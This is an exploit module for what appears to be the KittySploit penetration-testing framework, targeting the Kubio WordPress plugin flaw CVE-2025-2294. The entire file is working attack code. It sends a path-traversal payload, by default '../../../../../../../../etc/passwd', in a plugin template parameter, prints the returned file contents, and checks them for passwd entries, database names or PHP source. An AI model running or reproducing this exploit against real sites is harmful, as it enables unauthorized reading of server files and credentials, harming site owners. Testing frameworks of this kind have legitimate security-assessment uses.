#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Kubio CVE-2025-2294 — classic template path traversal file read."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "Kubio CVE-2025-2294 local file inclusion",
        "description": (
            "Auxiliary read via __kubio-site-edit-iframe-classic-template traversal. "
            "No application session — outputs file contents only."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2025-2294"],
        "references": ["https://github.com/Nxploited/CVE-2025-2294"],
        "tags": ["wordpress", "kubio", "lfi", "auxiliary", "cve-2025-2294"],
    }

    path = OptString("/", "WordPress base path", required=False)
    read_file = OptString("../../../../../../../../etc/passwd", "Traversal path (from plugin root)", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        target = (self.read_file or "../../../../../../../../etc/passwd").strip()
        r = self.http_request(
            method="GET",
            path=self._join("/"),
            params={
                "__kubio-site-edit-iframe-preview": "1",
                "__kubio-site-edit-iframe-classic-template": target,
            },
            allow_redirects=False,
        )
        if not r or r.status_code != 200:
            print_error("LFI request failed")
            return False
        body = r.text or ""
        print_status(body[:2500])
        if re.search(r"root:|DB_NAME|<?php", body):
            print_success("File content retrieved")
            return True
        print_warning("Response may not contain expected file markers")
        return True
